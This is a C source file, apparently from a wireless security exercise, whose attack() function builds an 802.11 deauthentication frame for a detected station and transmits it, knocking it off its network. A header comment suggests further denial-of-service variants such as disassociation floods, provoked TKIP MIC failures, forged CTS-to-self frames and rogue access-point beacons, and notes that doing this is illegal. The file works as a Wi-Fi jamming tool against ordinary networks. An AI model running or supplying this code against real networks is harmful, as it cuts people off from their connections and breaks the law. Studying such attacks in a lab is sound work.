#include <moepcommon/util.h>
#include <moepcommon/types.h>

#include "attack.h"
#include "deauth.h"
#include "helper.h"
#include "defender.h"
#include "global.h"


/*
 * This is our playground: attack() is called whenever a suspicious frame was
 * received. The frame in question is passed to attack(). Whitelisting was
 * already considered. It is up to you what next happens.
 *
 * Some examples:
 * 1) We unconditionally mount a deauth attack by creating a deauth frame (see
 *    deauth.c) and transmitting it.
 * 2) Let's do that only with some probability to avoid flooding the ether with
 *    deauths that may point to us.
 * 3) Create a new timeout_t with some random timeout value to make sure that
 *    this very STA will be punished for using our channel.
 * 4) Implement a different DoS attack, e.g.
 *    a) implement something similar to deauth by using disassociation frames
 *       instead,
 *    b) try to cause MIC failures in networks that use TKIP at least for
 *       groupwise communication,
 *    c) forge CTS to self control messages to fool the network allocation
 *       vectors of other nodes,
 *    d) start sending beacons on behalf of another AP and try to lure STAs to
 *       your own faked AP,
 *    e) ...
 *
 * Remember that doing this is forbidden by law.
 */


int
attack(moep_frame_t frame)
{
	struct ieee80211_hdr_gen *hdr;
	moep_frame_t f;
	u8 hwaddr[IEEE80211_ALEN];
	u8 bssid[IEEE80211_ALEN];

	if (!(hdr = moep_frame_ieee80211_hdr(frame))) {
		LOG(LOG_ERR, "moep_frame_ieee80211_hdr() failed");
		return -1;
	}

	if (0 > get_bssid(bssid, hdr)) {
		return -1;
		//LOG(LOG_INFO, "bssid not found");
	}

	if (0 > get_sta_hwaddr(hwaddr, hdr)) {
		return -1;
		//LOG(LOG_INFO, "sta hwaddr not found");
	}

	f = deauth(hwaddr, bssid);
	rad_tx(f);
	LOG(LOG_ERR, "attack!");

	moep_frame_destroy(f);

	return 0;
}

